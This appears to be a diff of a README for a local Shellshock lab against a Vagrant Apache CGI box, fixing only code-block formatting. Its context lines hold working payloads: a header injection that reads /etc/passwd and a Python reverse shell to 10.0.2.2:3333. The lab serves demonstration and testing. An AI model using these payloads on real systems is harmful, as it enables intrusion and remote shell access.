@@ -3,7 +3,7 @@
 ## Setup
   1. Set up a vagrant box using this vagrant file. This will install Apache and forward to port 8080.. 
   2. Create a cgi file in /usr/lib/cgi-bin. It can be as simple as html content type "hello world."  
-  3. Test the following vulnerabilities against "http://localhost:8080/cgi-bin/some_file_of_your_choice.sh" 
+  3. Test the following vulnerabilities against http://localhost:8080/cgi-bin/somefileofyourchoice.sh 
 
 
 ## Demoing the vulnerability
@@ -11,7 +11,7 @@
 
 ```sh
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
-```sh
+```
 
 (If you see "vulnerable" you need to update bash. Otherwise, you should be good to go.)
 
@@ -22,17 +22,17 @@ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 
 ```sh
 curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'hi world of exploits'" http://localhost:8080/cgi-bin/shellshock_test.sh
-```sh
+```
 
 #### To copy passwords: 
 ```sh
 curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/shellshock_test.sh
-```sh
+```
 
 #### To create a reverse shell:
 ```sh
 curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
-```sh
+```
 
 
 ## More information about Shellshock: 
